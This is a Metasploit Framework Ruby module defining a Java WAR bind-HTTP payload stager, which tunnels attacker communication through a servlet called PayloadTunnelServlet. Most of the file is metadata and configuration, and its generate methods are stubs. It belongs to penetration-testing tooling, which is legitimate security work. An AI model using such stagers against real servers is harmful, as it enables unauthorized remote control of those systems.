##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/war_bind_http'

module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Java

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Java .WAR Bind HTTP Stager',
			'Version'       => '$Revision$',
			'Description'   => 'Tunnel communication with a HTTP servlet',
			'Author'        => [
					'mihi',
					'hdm',   # windows/reverse_http
				],
			'License'       => MSF_LICENSE,
			'Platform'      => 'java',
			'Arch'          => ARCH_JAVA,
			'Handler'       => Msf::Handler::WarBindHttp,
			'Convention'    => 'javaurl',
			'Stager'        => {'Payload' => ""}
			))

		@class_files = [ ]
	end

	def config
		"Spawn=0\nURL=call:metasploit.#{war_servlet_name}\n"
	end

	#
	# Always wait at least 20 seconds for this payload (due to staging delays)
	#
	def wfs_delay
		20
	end
	
	def war_servlet_name
		"PayloadTunnelServlet"
	end
	
	# avoid error while loading since generate_jar does not work
	def generate
		""
	end
	
	# Use this stager only with war files
	def generate_jar(opts={})
		raise RuntimeError, "war_bind_http cannot generate .jar files"
	end
end
